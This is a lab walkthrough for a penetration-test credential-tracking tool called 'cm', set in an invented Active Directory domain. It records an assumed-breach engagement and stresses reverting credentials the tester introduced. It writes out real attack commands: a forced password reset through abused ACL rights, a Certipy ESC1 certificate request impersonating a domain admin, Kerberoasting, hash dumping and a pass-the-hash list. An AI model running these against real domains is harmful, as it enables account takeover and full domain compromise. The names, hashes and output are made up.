# Lab 03 — Arasaka (HackSmarter-style assumed breach)

**Range style:** [HackSmarter](https://hacksmarter.io) AD series — an *assumed
breach* start (client hands you a low-priv domain cred) through ACL abuse, NTLM,
and ADCS to Domain Admin.
**Goal:** show the `cm` flows the GOAD labs didn't — `reset` (credentials *you*
introduce), the remediation export, `merge`, and certificate blobs with `unlock`.

> Mock lab in the HackSmarter *style*; the real write-ups site was unreachable
> when this was generated, so names/hashes are invented. Domain: `arasaka.corp`,
> DC `arasaka-dc01`, workstation `night-city-ws` (10.10.10.20).

```bash
export CM_DB=~/engagements/arasaka/engagement.db
cm init
```

---

## Step 1 — The assumed-breach credential

The client gives you a starting account. Record it, then prove it logs in.

```bash
cm cred 'arasaka.corp\david.martinez' --pass 'Samurai2077!' --src 'assumed-breach cred (client-provided)'
cm works 'arasaka.corp\david.martinez' --at arasaka-dc01 --proto smb --priv user
```
```
  + secret #1 plaintext Samurai2077!
  + link arasaka.corp\david.martinez <-> #1 plaintext Samurai2077!
  + access arasaka.corp\david.martinez -> smb/arasaka-dc01 [valid, user]
```

---

## Step 2 — Kerberoast `svc_backup` (via BloodHound) and crack

```bash
cm cred 'arasaka.corp\svc_backup' \
  --hash 'kerberos_tgs:$krb5tgs$23$*svc_backup$ARASAKA.CORP*$deadbeef...' \
  --src 'targetedKerberoast via david.martinez'
cm cracked --from hashcat.potfile       # -> Mikoshi!2023
```

---

## Step 3 — ACL abuse: `reset` a password you now control

BloodHound shows `svc_backup` has **GenericAll** over `goro.takemura`. You force a
new password. This is **your** credential, not one you found — `reset` records it
with origin **`introduced`** (and supersedes any prior secret the account had):

```bash
# attack
net rpc password goro.takemura 'Claude_Reset_2026!' -U arasaka.corp/svc_backup%'Mikoshi!2023' -S arasaka-dc01
```
```bash
cm reset 'arasaka.corp\goro.takemura' --pass 'Claude_Reset_2026!' \
  --src 'ForceChangePassword (GenericAll via svc_backup)'
```
```
  + secret #4 plaintext Claude_Reset_2026!
  + link arasaka.corp\goro.takemura <-> #4 plaintext Claude_Reset_2026! origin=introduced
```

Why the distinction matters: credentials you *introduced* are things you must
**revert and report**. They're kept out of the default `export passwords` reuse
wordlist (they aren't environment passwords), and you can list exactly them later
(Step 9).

---

## Step 4 — Local admin → dump the workstation SAM (local accounts)

`goro` is local admin on `night-city-ws`. Dumping SAM yields **local** accounts →
`--host`.

```bash
cm import samdump --host night-city-ws ws_sam.txt
```
```
  + host night-city-ws
imported: 2 NT hash(es)
```

---

## Step 5 — An `nxc` spray run (IP and hostname auto-unify)

Step 4's SAM filed the box under its **hostname** (`night-city-ws`); this nxc run
references it by **IP** (`10.10.10.20`). `cm` reads the IP↔hostname pairing nxc
prints on every line and registers it as an alias, so the box stays **one host** —
no split, nothing to merge.

```bash
cm import nxc spray.nxc       # 2 logins: arasaka.corp\david.martinez and NIGHT-CITY-WS\Administrator
```
```
imported: 2 valid login(s) from nxc output
```
```bash
cm ls | sed -n '/hosts/,/domains/p'
```
```
hosts (2):
  10.10.10.20  (aka night-city-ws)
  arasaka-dc01

domains (1):
```

The SAM's `Administrator@night-city-ws` and the nxc's `Administrator@10.10.10.20`
are now the **same** identity on the one host — no duplicate, no merge.

> Reference a box by IP in one place and by name in another and they still land on
> one host — declare it yourself any time with `cm add host NAME --alias OTHER`.

---

## Step 6 — `merge` the one split aliases *don't* fix (domain vs local)

Host aliases unify two **names for one box**. They don't help when the same
*account* is filed under two different **realms** — e.g. Responder captured
`NIGHT-CITY-WS\localadmin` (the `\` made `cm` read it as a *domain*), while nxc saw
it as the **local** `localadmin@night-city-ws`. That's what `merge` is for:

```bash
cm merge 'NIGHT-CITY-WS\localadmin' 'localadmin@10.10.10.20'
```
```
  - merged NIGHT-CITY-WS\localadmin into localadmin@10.10.10.20 (1 secrets, 0 accesses, 1 observations)
```

> Tell-tale that `COMPUTER\user` is really local, not a domain:
> `NetBIOS_Domain_Name == NetBIOS_Computer_Name` in your scan. File it as
> `user@host` from the start.

---

## Step 7 — ADCS ESC1: a PFX, and its passphrase via `unlock`

Certipy abuses a vulnerable template to mint a certificate for a domain admin.
Store the **PFX as a blob**, then link its passphrase with `unlock` — a
secret-to-secret relationship (the passphrase unlocks the key; it isn't a login).

```bash
# attack
certipy req -u david.martinez@arasaka.corp -p 'Samurai2077!' -ca ARASAKA-CA -template VulnTemplate -upn hanako.arasaka@arasaka.corp
```
```bash
cm cred 'arasaka.corp\hanako.arasaka' --pfx hanako.pfx --src 'Certipy ESC1 (ESC1 vuln template)'
cm unlock --pfx '#9' --passphrase 'certipy'
```
```
  + secret #9 certificate_pfx (blob)
  + secret #10 plaintext certipy
  + unlocks #10 plaintext certipy -> #9 certificate_pfx (blob)
[note: passphrase links to the key, not to any login]
```

The passphrase (`#10`) is owned by no identity, so it appears under **loose
secrets** in `cm ls` — correct: it belongs to the *key*, not to a person. Dump the
PFX back out any time with `cm export key '#9' > hanako.pfx`.

---

## Step 8 — Cert → TGT → DCSync

```bash
cm import samdump --domain arasaka.corp arasaka_ntds.txt
```
```
imported: 3 NT hash(es)
```

`hanako.arasaka` now carries her cert **and** her DCSync'd NT hash on one identity:

```bash
cm show user 'arasaka.corp\hanako.arasaka'
```
```
arasaka.corp\hanako.arasaka
  secrets:
    #9 certificate_pfx (blob)
    #13 ntlm caffe00dd11ee22ff33445566778899a
  found via: Certipy ESC1 (ESC1 vuln template), ntds-dump
```

---

## Step 9 — The remediation report (what you must revert)

The single most report-useful query here: **every credential you introduced** —
the password you force-reset — so the client can revert it.

```bash
cm export pairs --introduced
```
```
goro.takemura:Claude_Reset_2026!
```

And the usual payoff views — note every host login is against the single unified
box (`10.10.10.20`), not split across IP and hostname:
```bash
cm where --valid
```
```
valid accesses:
  arasaka.corp\david.martinez  smb/arasaka-dc01  valid  [user]
  arasaka.corp\david.martinez  smb/10.10.10.20  valid  [user]
  Administrator@10.10.10.20  smb/10.10.10.20  valid  [local_admin]
  localadmin@10.10.10.20  smb/10.10.10.20  valid  [local_admin]
```
```bash
cm export pairs --type ntlm   # pass-the-hash list
cm ls                         # full picture incl. '[introduced]' and 'loose secrets'
```

## `cm` features this lab exercised

- **`reset`** — a password *you* set via ACL abuse, recorded as `introduced`
  (and auto-supersedes any prior secret)
- **`export pairs --introduced`** — the revert-this remediation list
- `import nxc` — console output, local-vs-domain realm handling, **auto-unifies**
  the box by IP and hostname (host aliases — no split, no merge)
- **`merge`** — reconcile an *account* filed under two realms (domain vs local);
  the thing host aliases don't fix
- `cred --pfx` + **`unlock --passphrase`** — certificate blob + its passphrase as a
  secret-to-secret `unlocks` link (shows under *loose secrets*)
- `export key` — write a stored key/pfx/ticket blob back to disk
